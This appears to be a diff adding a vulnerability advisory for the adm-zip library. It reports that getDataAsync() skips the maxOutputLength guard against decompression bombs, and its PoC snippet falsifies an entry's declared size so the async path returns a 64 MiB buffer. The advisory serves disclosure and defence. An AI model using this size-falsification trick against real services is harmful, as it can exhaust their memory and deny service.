@@ -1,0 +1,23 @@
+Summary
+adm-zip enforces a maxOutputLength guard against decompression bombs on its synchronous getData() path, but the equivalent asynchronous getDataAsync() path does not enforce it — it accumulates and returns the entire decompressed output regardless of the entry's declared size. An application that checks an entry's declared size before deciding to process it, then reads the entry via getDataAsync() (a completely ordinary, often-recommended choice for I/O in Node.js), gets none of the protection it believes it has.
+
+Details
+methods/inflater.js:3-10 passes {maxOutputLength: expectedLength} to inflateRawSync, which Node enforces.
+methods/inflater.js:12-31 passes the same option to createInflateRaw but never enforces it on the streaming path — it just accumulates every chunk and allocates a final Buffer of whatever size resulted.
+PoC
+const AdmZip = require('adm-zip');
+const zip = new AdmZip();
+zip.addFile('p', Buffer.alloc(64 * 1024 * 1024, 0x41)); // 64 MiB
+const raw = Buffer.from(zip.toBuffer());
+// patch the local + central declared uncompressed size to 1 byte
+raw.writeUInt32LE(1, localHeaderSizeOffset);
+raw.writeUInt32LE(1, centralHeaderSizeOffset);
+const entry = new AdmZip(raw).getEntry('p');
+
+entry.getData();
+// throws: ERR_BUFFER_TOO_LARGE: Cannot create a Buffer larger than 1 bytes
+
+entry.getDataAsync((data, error) => { ... });
+// returns the full 67,108,864-byte buffer, error is undefined
+Impact
+An application that validates a declared size before reading an entry, then uses the async API, gets no protection against a high-ratio DEFLATE payload. Repeated or larger requests could contribute to memory exhaustion.
